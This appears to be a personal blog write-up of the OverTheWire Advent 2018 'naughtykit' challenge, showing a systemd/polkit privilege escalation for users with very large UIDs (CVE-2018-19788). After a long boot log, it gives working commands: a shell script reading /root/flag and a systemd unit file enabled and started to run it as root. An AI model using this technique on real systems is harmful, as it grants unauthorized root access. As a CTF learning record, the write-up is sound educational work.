---
layout:     post
title:      "OverTheWire Advent - naughtykit"
date:       2018-12-29 0:00:00
author:     "W3ndige"
permalink: /:title/
category: 'OverTheWire Advent 2018'
---

Altough 2018 edition of **OverTheWire Advent Bonanza** has ended, I decided to come back and try to pwn challenges that I could not finish during the competition. For the first one, I've wanted to try the **naughtykit**. 

```text
 O'boy, o'boy was this kit naughty this year or what. There's no present for him for sure! But .. what if he's too naughty? 
```

In addition, we get a `ssh` command in oredr to log into the server with user `naughtykit` and password `naughtykit`.

```text
[w3ndige@main ~]$  ssh -p 1217 naughtykit@3.81.191.176
The authenticity of host '[3.81.191.176]:1217 ([3.81.191.176]:1217)' can't be established.
ECDSA key fingerprint is SHA256:OfMbRvEMyejhW6Q1hUHDMl/PfZVHV5HOYawZCJye+cI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[3.81.191.176]:1217' (ECDSA) to the list of known hosts.
naughtykit@3.81.191.176's password: 
Linux version 4.9.18-otw (root@vblx03) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #15 Fri Dec 7 16:31:26 CET 2018
Command line: root=/dev/vda1 console=ttyS0,115200 noapic
x86/fpu: Legacy x87 FPU detected.
x86/fpu: Using 'eager' FPU context switches.
e820: BIOS-provided physical RAM map:
BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
BIOS-e820: [mem 0x0000000000100000-0x0000000003fdbfff] usable
BIOS-e820: [mem 0x0000000003fdc000-0x0000000003ffffff] reserved
BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
NX (Execute Disable) protection: active
SMBIOS 2.8 present.
e820: last_pfn = 0x3fdc max_arch_pfn = 0x400000000
x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WC  UC- WT  
found SMP MP-table at [mem 0x000f6a90-0x000f6a9f] mapped at [ffff8800000f6a90]
Zone ranges:
  DMA      [mem 0x0000000000001000-0x0000000000ffffff]
  DMA32    [mem 0x0000000001000000-0x0000000003fdbfff]
  Normal   empty
Movable zone start for each node
Early memory node ranges
  node   0: [mem 0x0000000000001000-0x000000000009efff]
  node   0: [mem 0x0000000000100000-0x0000000003fdbfff]
Initmem setup node 0 [mem 0x0000000000001000-0x0000000003fdbfff]
Intel MultiProcessor Specification v1.4
MPTABLE: OEM ID: BOCHSCPU
MPTABLE: Product ID: 0.1         
MPTABLE: APIC at: 0xFEE00000
Processor #0 (Bootup-CPU)
IOAPIC[0]: apic_id 0, version 32, address 0xfec00000, GSI 0-23
Processors: 1
e820: [mem 0x04000000-0xfffbffff] available for PCI devices
clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645519600211568 ns
Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 15973
Kernel command line: root=/dev/vda1 console=ttyS0,115200 noapic
PID hash table entries: 256 (order: -1, 2048 bytes)
Dentry cache hash table entries: 8192 (order: 4, 65536 bytes)
Inode-cache hash table entries: 4096 (order: 3, 32768 bytes)
Memory: 55204K/65000K available (2925K kernel code, 406K rwdata, 528K rodata, 600K init, 320K bss, 9796K reserved, 0K cma-reserved)
SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
NR_IRQS:4352 nr_irqs:256 16
Console: colour VGA+ 80x25
console [ttyS0] enabled
tsc: Fast TSC calibration using PIT
tsc: Detected 2300.120 MHz processor
Calibrating delay loop (skipped), value calculated using timer frequency.. 4600.24 BogoMIPS (lpj=9200480)
pid_max: default: 32768 minimum: 301
Mount-cache hash table entries: 512 (order: 0, 4096 bytes)
Mountpoint-cache hash table entries: 512 (order: 0, 4096 bytes)
mce: CPU supports 10 MCE banks
Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
CPU: AMD QEMU Virtual CPU version 2.5+ (family: 0x6, model: 0x6, stepping: 0x3)
Performance Events: PMU not available due to virtualization, using software events only.
devtmpfs: initialized
clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
futex hash table entries: 256 (order: 0, 6144 bytes)
NET: Registered protocol family 16
cpuidle: using governor ladder
PCI: Using configuration type 1 for base access
vgaarb: loaded
SCSI subsystem initialized
PCI: Probing PCI hardware
PCI host bridge to bus 0000:00
pci_bus 0000:00: root bus resource [io  0x0000-0xffff]
pci_bus 0000:00: root bus resource [mem 0x00000000-0xffffffffff]
pci_bus 0000:00: No busn resource found for root bus, will use [bus 00-ff]
pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
vgaarb: setting as boot device: PCI:0000:00:02.0
vgaarb: device added: PCI:0000:00:02.0,decodes=io+mem,owns=io+mem,locks=none
pci 0000:00:01.0: PIIX/ICH IRQ router [8086:7000]
clocksource: Switched to clocksource refined-jiffies
NET: Registered protocol family 2
TCP established hash table entries: 512 (order: 0, 4096 bytes)
TCP bind hash table entries: 512 (order: 0, 4096 bytes)
TCP: Hash tables configured (established 512 bind 512)
UDP hash table entries: 256 (order: 1, 8192 bytes)
UDP-Lite hash table entries: 256 (order: 1, 8192 bytes)
NET: Registered protocol family 1
pci 0000:00:00.0: Limiting direct PCI/PCI transfers
pci 0000:00:01.0: PIIX3: Enabling Passive Release
pci 0000:00:01.0: Activating ISA DMA hang workarounds
pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
platform rtc_cmos: registered platform RTC device (no PNP device found)
workingset: timestamp_bits=62 max_order=14 bucket_order=0
Block layer SCSI generic (bsg) driver version 0.4 loaded (major 254)
io scheduler noop registered
io scheduler deadline registered
io scheduler cfq registered (default)
virtio-pci 0000:00:04.0: found PCI INT A -> IRQ 11
virtio-pci 0000:00:05.0: found PCI INT A -> IRQ 10
pci 0000:00:01.3: IRQ routing conflict: have IRQ 9, want IRQ 10
Serial: 8250/16550 driver, 4 ports, IRQ sharing disabled
serial8250: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
 vda: vda1
VMware PVSCSI driver - version 1.0.7.0-k
serio: i8042 KBD port at 0x60,0x64 irq 1
serio: i8042 AUX port at 0x60,0x64 irq 12
NET: Registered protocol family 17
input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input0
EXT4-fs (vda1): mounting ext3 file system using the ext4 subsystem
EXT4-fs (vda1): mounted filesystem with ordered data mode. Opts: (null)
VFS: Mounted root (ext3 filesystem) readonly on device 254:1.
devtmpfs: mounted
Freeing unused kernel memory: 600K (ffffffff81667000 - ffffffff816fd000)
Write protecting the kernel read-only data: 6144k
Freeing unused kernel memory: 1160K (ffff8800012de000 - ffff880001400000)
Freeing unused kernel memory: 1520K (ffff880001484000 - ffff880001600000)
random: fast init done
systemd[1]: Failed to insert module 'autofs4': No such file or directory
systemd[1]: systemd 232 running in system mode. (+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN)
systemd[1]: Detected virtualization vm-other.
systemd[1]: Detected architecture x86-64.

Welcome to Debian GNU/Linux 9 (stretch)!

systemd[1]: Set hostname to <northpole>.
clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2127a6a60ad, max_idle_ns: 440795288991 ns
clocksource: Switched to clocksource tsc
systemd[1]: Listening on Journal Socket (/dev/log).
[  OK  ] Listening on Journal Socket (/dev/log).
systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
[  OK  ] Started Dispatch Password Requests to Console Directory Watch.
systemd[1]: Listening on /dev/initctl Compatibility Named Pipe.
[  OK  ] Listening on /dev/initctl Compatibility Named Pipe.
systemd[1]: Listening on Journal Socket.
[  OK  ] Listening on Journal Socket.
systemd[1]: Created slice User and Session Slice.
[  OK  ] Created slice User and Session Slice.
systemd[1]: Listening on udev Kernel Socket.
[  OK  ] Listening on udev Kernel Socket.
[  OK  ] Reached target Swap.
[  OK  ] Listening on Syslog Socket.
[  OK  ] Listening on udev Control Socket.
[  OK  ] Started Forward Password Requests to Wall Directory Watch.
[  OK  ] Reached target Encrypted Volumes.
[  OK  ] Reached target Paths.
[  OK  ] Created slice System Slice.
[  OK  ] Reached target Slices.
         Starting Load Kernel Modules...
         Starting Remount Root and Kernel File Systems...
         Starting Journal Service...
         Starting Create Static Device Nodes in /dev...
[  OK  ] Created slice system-serial\x2dgetty.slice.
[  OK  ] Started Load Kernel Modules.
EXT4-fs (vda1): re-mounted. Opts: (null)
         Starting Apply Kernel Variables...
[  OK  ] Started Remount Root and Kernel File Systems.
[  OK  ] Started Create Static Device Nodes in /dev.
[  OK  ] Started Apply Kernel Variables.
         Starting udev Kernel Device Manager...
         Starting Load/Save Random Seed...
[  OK  ] Reached target Local File Systems (Pre).
[  OK  ] Reached target Local File Systems.
         Starting Raise network interfaces...
         Starting udev Coldplug all Devices...
[  OK  ] Started Journal Service.
[  OK  ] Started Load/Save Random Seed.
clocksource: timekeeping watchdog on CPU0: Marking clocksource 'tsc' as unstable because the skew is too large:
clocksource:                       'refined-jiffies' wd_now: fffedfb8 wd_last: fffedf38 mask: ffffffff
clocksource:                       'tsc' cs_now: 25ecc19822 cs_last: 1c843f3786 mask: ffffffffffffffff
clocksource: Switched to clocksource refined-jiffies
[  OK  ] Started udev Kernel Device Manager.
         Starting Flush Journal to Persistent Storage...
systemd-journald[52]: Received request to flush runtime journal from PID 1
[  OK  ] Started Flush Journal to Persistent Storage.
         Starting Create Volatile Files and Directories...
[  OK  ] Started Create Volatile Files and Directories.
         Starting Update UTMP about System Boot/Shutdown...
[  OK  ] Started Update UTMP about System Boot/Shutdown.
[  OK  ] Started udev Coldplug all Devices.
[  OK  ] Found device /dev/ttyS0.
[  OK  ] Found device /dev/vdb.
         Mounting /root...
[  OK  ] Reached target System Initialization.
[  OK  ] Started Daily Cleanup of Temporary Directories.
[  OK  ] Reached target Timers.
[  OK  ] Listening on D-Bus System Message Bus Socket.
[  OK  ] Reached target Sockets.
[  OK  ] Reached target Basic System.
EXT4-fs (vdb): mounting ext2 file system using the ext4 subsystem
EXT4-fs (vdb): mounted filesystem without journal. Opts: (null)
[  OK  ] Started Regular background program processing daemon.
         Starting Login Service...
[  OK  ] Started D-Bus System Message Bus.
         Starting System Logging Service...
[  OK  ] Mounted /root.
[  OK  ] Started System Logging Service.
[  OK  ] Started Raise network interfaces.
[  OK  ] Reached target Network.
         Starting /etc/rc.local Compatibility...
         Starting Permit User Sessions...
[  OK  ] Started /etc/rc.local Compatibility.
[  OK  ] Started Permit User Sessions.
[  OK  ] Started Login Service.
[  OK  ] Started Serial Getty on ttyS0.
[  OK  ] Reached target Login Prompts.
[  OK  ] Reached target Multi-User System.
[  OK  ] Reached target Graphical Interface.
         Starting Update UTMP about System Runlevel Changes...
[  OK  ] Started Update UTMP about System Runlevel Changes.


                  _
                _[_]_
                 (")
             `--( : )--'
               (  :  )
         jgs ""`-...-'""


username: elf
password: elf

You've been a naughty kit, ho-ho-hoo!

northpole login: elf (automatic login)

Linux northpole 4.9.18-otw #15 Fri Dec 7 16:31:26 CET 2018 x86_64
elf@northpole:~$ whoami
elf
``` 

But after the connection, we can notice that the new machine is being run, where automatically we're logged into user `elf`. 

```text
elf@northpole:~$ uname -a
Linux northpole 4.9.18-otw #15 Fri Dec 7 16:31:26 CET 2018 x86_64 GNU/Linux
```

During enumeration, nothing came unusal. But what I've not noticed during the competition is the very high `UID` number of of `elf` user. 

```text
elf@northpole:~$ id
uid=4020181224(elf) gid=100(users) groups=100(users)
elf@northpole:~$ systemctl --version
systemd 232
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN
```

Researching this more showed very new exploit, shown in [this](https://gitlab.freedesktop.org/polkit/polkit/issues/74/) and this [this](https://github.com/systemd/systemd/issues/11026) link. 

With that information, we can run `systemctl` command, with which we can try to files from `/root` directory and effectively, the flag. As I've found additional [POC](https://github.com/AbsoZed/CVE-2018-19788), we can try to replicate it.

Firstly let's create a `dup.sh` script that will read the contents from the `/root` directory int a file in `elf` home directory. In addition we have to add execution privilages to the script.

```sh
cat <<EOF >> /home/elf/dup.sh
#!/bin/sh

cat /root/flag > /home/elf/flag
EOF


cat <<EOF > /home/elf/dup.sh
#!/bin/sh

ls -al /root/ > /home/elf/dir
EOF
elf@northpole:~$ chmod +x dup.sh
```

Now we can create a service that will execute our script. This service will run with root privilages so it will be able to execute our command without a problem.

```text
elf@northpole:~$ cat <<EOF > /home/elf/vulnerable.service
> [Unit]
> Description=pwn
> After=network.target
>  
> [Service]
> ExecStart=/home/elf/dup.sh
> ExecReload=/home/elf/dup.sh
> Restart=on-failure
> RuntimeDirectoryMode=0755
>  
> [Install]
> WantedBy=multi-user.target
> Alias=vulnerable.service
> EOF
```

Now it's just a matter of enabling and starting the service.

``text
elf@northpole:~$ systemctl enable /home/elf/vulnerable.service
(process:178): GLib-GObject-WARNING **: value "-274786072" of type 'gint' is invalid or out of range for property 'uid' of type 'gint'
**
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) >= 0)
Created symlink /etc/systemd/system/vulnerable.service → /home/elf/vulnerable.service.
Created symlink /etc/systemd/system/multi-user.target.wants/vulnerable.service → /home/elf/vulnerable.service.
elf@northpole:~$ systemctl start vulnerable.service

(process:195): GLib-GObject-WARNING **: value "-274786072" of type 'gint' is invalid or out of range for property 'uid' of type 'gint'
**
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) >= 0)
```

And now we have a new file in our directory. 

```text
elf@northpole:~$ cat root_dir
cat: root_dir: No such file or directory
elf@northpole:~$ cat dir     
total 4
drwx------  3 root root 1024 Dec  7 22:07 .
drwxr-xr-x 19 root root 1024 Dec  7 21:14 ..
lrwxrwxrwx  1 root root    9 Dec  7 22:07 .bash_history -> /dev/null
-r--------  1 root root   29 Dec  7 22:06 flag
drwx------  2 root root 1024 Dec  7 22:31 lost+found
```

Now let's do the same, but our script will read the contents of flag and pass it to file in our directory. All other steps are the same.

```text
elf@northpole:~$ cat <<EOF >> /home/elf/dup.sh
> #!/bin/sh
> 
> cat /root/flag > /home/elf/flag
> EOF

elf@northpole:~$ systemctl start vulnerable.service

(process:208): GLib-GObject-WARNING **: value "-274786072" of type 'gint' is invalid or out of range for property 'uid' of type 'gint'
**
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) >= 0)
elf@northpole:~$ ls -la
total 12
drwx------ 2 elf  users 1024 Dec 30 12:35 .
drwxr-xr-x 3 root root  1024 Dec  6 23:48 ..
lrwxrwxrwx 1 root root     9 Dec  7 00:54 .bash_history -> /dev/null
-rw-r--r-- 1 elf  users  220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  users 3526 May 15  2017 .bashrc
-rw-r--r-- 1 elf  users  675 May 15  2017 .profile
-rw-r--r-- 1 root root   266 Dec 30 12:35 dir
-rw-r--r-- 1 root root    29 Dec 30 12:35 flag
-rw-r--r-- 1 elf  users  213 Dec 30 12:33 vulnerable.service
-rwxr-xr-x 1 elf  users   84 Dec 30 12:35 dup.sh
```

And here we have the flag. 

```text
elf@northpole:~$ cat flag
AOTW{INtEgerzRhARds0mETIm35}
```